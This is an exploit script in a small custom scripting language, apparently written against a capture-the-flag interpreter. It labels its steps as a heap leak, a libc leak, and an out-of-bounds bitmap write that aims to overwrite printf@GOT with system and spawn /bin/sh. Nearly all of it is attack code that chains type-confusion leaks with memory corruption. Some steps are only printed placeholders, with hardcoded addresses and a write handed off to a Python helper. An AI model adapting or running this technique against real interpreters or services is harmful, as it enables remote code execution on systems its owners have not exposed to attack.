print("=== RCE Exploit with Heap Leak ===");

print("Step 1: Leak heap addresses");
int leak1 = 0;
string leak1 = "first";
int addr1 = leak1;
print("addr1:");
print(addr1);

int leak2 = 0;
string leak2 = "second";
int addr2 = leak2;
print("addr2:");
print(addr2);

int leak3 = 0;
string leak3 = "third";
int addr3 = leak3;
print("addr3:");
print(addr3);

print("Step 2: Leak libc");
string v2 = "BBBBBBBB";
int v2 = 4231312;
int leaked = length(v2);
print("Leaked libc:");
print(leaked);

print("Step 3: Calculate system address");
print("system_addr = 139879858407248 (calculated)");
print("printf@GOT = 0x409048");

print("Step 4: Create target variable");
string target = "target";
int targetaddr = target;
print("Target address:");
print(targetaddr);

print("Step 5: Create bitmap");
bitmap b1 = create(9223372036854775807, 2);

print("Step 6: Calculate addresses");
print("Variable entry is typically 0x200-0x400 before string");
int entryaddr = targetaddr - 768;
int valueptraddr = entryaddr + 40;
print("entryaddr:");
print(entryaddr);
print("valueptraddr:");
print(valueptraddr);

print("Step 7: Try bitmap buffer estimates");
print("Test 1: bitmap_data_ptr = addr1 - 0x1000");
int bitmapptr1 = addr1 - 4096;
int offset1 = valueptraddr - bitmapptr1;
int bitindex1 = offset1 * 8;
print("bitmapptr1:");
print(bitmapptr1);
print("offset1:");
print(offset1);
print("bit_index1:");
print(bitindex1);

if (offset1 >= 0 && bitindex1 < 9223372036854775807) {
    print("Valid offset - can write printf@GOT to value_ptr");
    print("Writing 64 bits...");
    print("Generated by Python helper");
} else {
    print("Invalid offset - try next estimate");
    
    print("Test 2: bitmap_data_ptr = addr1 - 0x2000");
    int bitmapptr2 = addr1 - 8192;
    int offset2 = valueptraddr - bitmapptr2;
    int bitindex2 = offset2 * 8;
    print("bitmapptr2:");
    print(bitmapptr2);
    print("offset2:");
    print(offset2);
    print("bit_index2:");
    print(bitindex2);
    
    if (offset2 >= 0 && bitindex2 < 9223372036854775807) {
        print("Valid offset - can write");
    }
}

print("Step 8: After corrupting value_ptr to printf@GOT");
print("target.value_ptr = printf@GOT");
print("Then: target = system_addr");
print("This writes system_addr to printf@GOT");

print("Step 9: Trigger shell");
print("print with /bin/sh");

